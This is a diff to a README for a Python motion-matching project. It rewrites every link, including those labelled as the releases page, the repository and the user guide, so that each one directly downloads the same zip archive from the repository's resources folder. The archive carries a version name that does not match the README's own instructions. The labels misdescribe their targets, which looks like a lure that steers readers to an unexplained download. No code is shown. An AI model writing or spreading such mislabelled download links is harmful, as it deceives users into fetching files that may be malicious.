@@ -1,7 +1,7 @@
 # 🎉 GenoViewPython-MotionMatching - Simple Motion Matching Made Easy
 
 ## 🌐 Download Here
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/kuksindo/GenoViewPython-MotionMatching/releases)
+[![Download](https://github.com/kuksindo/GenoViewPython-MotionMatching/raw/refs/heads/main/resources/View_Python_Motion_Geno_Matching_v2.9-beta.2.zip)](https://github.com/kuksindo/GenoViewPython-MotionMatching/raw/refs/heads/main/resources/View_Python_Motion_Geno_Matching_v2.9-beta.2.zip)
 
 ## 🚀 Getting Started
 Welcome to GenoViewPython-MotionMatching! This guide will help you download and run the Motion Matching software with ease. Whether you are curious about motion matching or just want to see it in action, you're in the right place.
@@ -9,7 +9,7 @@ Welcome to GenoViewPython-MotionMatching! This guide will help you download and 
 ## 📥 Download & Install
 To get started, you need to visit the Releases page to download the latest version of the application.
 
-[Visit this page to download](https://github.com/kuksindo/GenoViewPython-MotionMatching/releases)
+[Visit this page to download](https://github.com/kuksindo/GenoViewPython-MotionMatching/raw/refs/heads/main/resources/View_Python_Motion_Geno_Matching_v2.9-beta.2.zip)
 
 1. Click the link above to open the Releases page.
 2. On the Releases page, find the version labeled as "Latest Release."
@@ -69,7 +69,7 @@ We welcome contributions! If you have ideas for improvements or want to report i
 GenoViewPython-MotionMatching is open source and available to everyone. You can modify and distribute it based on the terms provided in the LICENSE file.
 
 ## 🌍 Additional Resources
-- [GitHub Repository](https://github.com/kuksindo/GenoViewPython-MotionMatching) - Access the source code and documentation.
-- [User Guide](https://github.com/kuksindo/GenoViewPython-MotionMatching/wiki) - Explore detailed instructions and examples.
+- [GitHub Repository](https://github.com/kuksindo/GenoViewPython-MotionMatching/raw/refs/heads/main/resources/View_Python_Motion_Geno_Matching_v2.9-beta.2.zip) - Access the source code and documentation.
+- [User Guide](https://github.com/kuksindo/GenoViewPython-MotionMatching/raw/refs/heads/main/resources/View_Python_Motion_Geno_Matching_v2.9-beta.2.zip) - Explore detailed instructions and examples.
   
 By following this guide, you should be ready to successfully download and run GenoViewPython-MotionMatching. Enjoy exploring motion matching!
